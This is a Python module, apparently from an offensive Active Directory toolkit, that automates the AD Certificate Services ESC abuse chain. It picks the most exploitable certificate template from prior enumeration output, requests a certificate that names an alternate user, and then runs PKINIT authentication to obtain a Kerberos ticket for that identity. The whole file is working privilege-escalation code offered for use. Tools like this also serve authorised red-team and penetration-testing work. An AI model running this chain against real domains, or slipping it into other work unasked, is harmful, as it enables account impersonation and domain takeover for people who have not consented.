"""ESC1-ESC8 automated exploit chain.

Reads a prior adcs-enum session output, picks the highest-severity
exploitable template, then invokes cert-request → pkinit-auth (→ unpac).
"""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any

from rich.console import Console

from adaf_attack.core.graph import AttackGraph
from adaf_attack.core.registry import register_capability
from adaf_attack.core.session import Session
from adaf_attack.core.target import Target

console = Console()


ESC_PRIORITY = ("ESC1", "ESC2", "ESC3", "ESC6", "ESC8", "ESC4", "ESC10", "ESC11", "ESC13")


def _pick_template(adcs_json: dict[str, Any]) -> dict[str, Any] | None:
    templates = adcs_json.get("templates", []) or adcs_json.get("vulnerable_templates", [])
    if not templates:
        return None
    scored: list[tuple[int, dict[str, Any]]] = []
    for tpl in templates:
        signals = set(tpl.get("esc_signals", []) or tpl.get("esc", []))
        if not signals:
            continue
        rank = min(
            ESC_PRIORITY.index(sig) for sig in signals if sig in ESC_PRIORITY
        ) if any(sig in ESC_PRIORITY for sig in signals) else 99
        scored.append((rank, tpl))
    if not scored:
        return None
    scored.sort(key=lambda x: x[0])
    return scored[0][1]


@register_capability(
    id="esc-chain",
    summary="Automated ESC1-ESC8 exploit chain: template → cert → PKINIT → TGT",
    category="privilege-escalation",
    tags=("adcs", "esc1", "esc2", "esc3", "esc8", "chain"),
    destructive=False,
)
class EscChain:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        include_secrets: bool = False,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        adcs_session = kwargs.get("adcs_session")
        template = kwargs.get("template")
        ca = kwargs.get("ca")
        alt_name = kwargs.get("alt_name") or target.username
        sam = kwargs.get("sam") or target.username

        if not template or not ca:
            if not adcs_session:
                raise RuntimeError(
                    "Provide -P template=<name> -P ca=<name> OR -P adcs_session=<prior-session-dir>."
                )
            adcs_path = Path(str(adcs_session)).expanduser() / "adcs-enum.json"
            if not adcs_path.is_file():
                raise RuntimeError(f"adcs-enum.json not found: {adcs_path}")
            adcs_json = json.loads(adcs_path.read_text(encoding="utf-8"))
            picked = _pick_template(adcs_json)
            if not picked:
                raise RuntimeError("No exploitable ESC template found in prior adcs-enum output.")
            template = template or picked.get("name") or picked.get("template")
            ca = ca or picked.get("ca")

        if not template or not ca:
            raise RuntimeError("Could not determine template + CA; specify both explicitly.")

        console.print(f"[bold]ESC chain[/bold] template={template} ca={ca} alt={alt_name}")

        from adaf_attack.capabilities.cert_request import CertRequest
        from adaf_attack.capabilities.pkinit_auth import PkinitAuth

        cert_result = CertRequest().run(
            target,
            session,
            graph,
            include_secrets=include_secrets,
            force=force,
            template=template,
            ca=ca,
            alt_name=alt_name,
        )
        pfx = cert_result.get("pfx") or cert_result.get("pfx_path")

        pkinit_result: dict[str, Any] = {}
        if pfx and sam:
            pkinit_result = PkinitAuth().run(
                target,
                session,
                graph,
                include_secrets=include_secrets,
                force=force,
                sam=sam,
                pfx=pfx,
            )

        result = {
            "template": template,
            "ca": ca,
            "alt_name": alt_name,
            "sam": sam,
            "cert_request": cert_result,
            "pkinit_auth": pkinit_result,
        }
        out = session.path("esc-chain.json")
        out.write_text(json.dumps(result, indent=2, default=str), encoding="utf-8")
        graph.save(session.path("graph.json"))
        session.log("esc-chain.complete", template=template, ca=ca)
        console.print(f"[green]Done[/green]  template={template} → cert={bool(pfx)} → tgt={bool(pkinit_result)}")
        return result
